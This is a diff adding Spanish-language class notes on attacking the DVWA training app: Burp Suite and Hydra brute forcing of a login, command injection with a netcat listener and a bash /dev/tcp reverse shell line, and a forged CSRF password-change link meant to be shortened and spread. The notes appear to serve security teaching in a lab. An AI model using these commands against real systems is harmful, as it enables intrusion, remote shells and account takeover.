@@ -512,3 +512,87 @@ Para realizar un ataque de fuerza bruta en una web, las herramientas recomendada
    - Seleccionar y añadir los parámetros correspondientes.
 
 ---
+
+
+# Notas de la Clase (12-12-2024)
+
+## Room DVWA: Ataques con Burp Suite para Fuerza Bruta
+
+### Pasos a seguir
+
+1. Introducir credenciales incorrectas para generar el mensaje de error.
+   - Esto permite que Burp Suite continúe y no se detenga al encontrar el mensaje de error.
+2. En Burp Suite, llevar el código del mensaje de error al Intruder.
+   - Agregar los campos de usuario y contraseña marcándolos con `Add`.
+   - Seleccionar el método **Cluster Bomb** para atacar ambos campos.
+3. Añadir un diccionario de contraseñas manualmente (como `rockyou.txt` o similar).
+4. En la pestaña **Settings** del Intruder, ir a `grep - extract` y agregar el mensaje de error.
+5. Ejecutar el ataque y analizar los resultados para identificar las combinaciones de usuario y contraseña válidas.
+
+---
+
+## Ataques con Hydra y Burp Suite
+
+### Pasos a seguir
+
+1. Provocar un error mientras inspeccionamos la página.
+2. Usar el siguiente comando para realizar un ataque con Hydra:
+
+   ```bash
+   hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346"
+   ```
+   > **Nota:** Si no funciona, actualizar la cookie.
+
+---
+
+## Ataques de Command Injection
+
+### Descripción
+
+- Se puede inyectar comandos usando `&` o `|` si la aplicación no está correctamente asegurada.
+
+### Explotación
+
+1. Preparar una reverse shell:
+
+   - En nuestra terminal:
+
+     ```bash
+     nc -lvp 8080
+     ```
+
+   - En la máquina víctima:
+
+     ```bash
+     bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+     ```
+
+2. Alternativamente, utilizar otras opciones disponibles en la [cheat sheet de reverse shells](https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/).
+
+---
+
+## Ataques de CSRF (Cross-Site Request Forgery)
+
+### Consideraciones
+
+- Este ataque solo es posible si existe una vulnerabilidad CSRF.
+- Común en aplicaciones con métodos **HTTP GET**.
+
+### Explotación
+
+1. Iniciar sesión en la aplicación.
+2. Copiar la URL que realiza el cambio de contraseña y modificarla para establecer una contraseña conocida:
+
+   ```
+   http://10.10.137.205/vulnerabilities/csrf/?password_new=1234&password_conf=1234&Change=Change#
+   ```
+
+3. Acortar el enlace y distribuirlo según sea necesario.
+
+### Alternativa con Burp Suite
+
+1. Realizar el cambio de contraseña desde la aplicación.
+2. Interceptar la solicitud en Burp Suite.
+3. Modificar la solicitud desde Burp Suite antes de enviarla, estableciendo una contraseña personalizada.
+
+---
